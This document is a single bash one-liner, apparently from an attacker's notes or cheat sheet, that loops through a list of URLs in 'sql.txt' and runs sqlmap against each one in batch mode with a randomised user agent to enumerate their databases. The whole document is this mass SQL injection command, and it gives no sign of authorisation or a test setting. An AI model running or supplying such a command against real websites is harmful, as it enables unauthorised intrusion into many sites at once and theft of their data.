for a in $(cat sql.txt); do sqlmap -u $a --dbs --random-agent  --batch; done
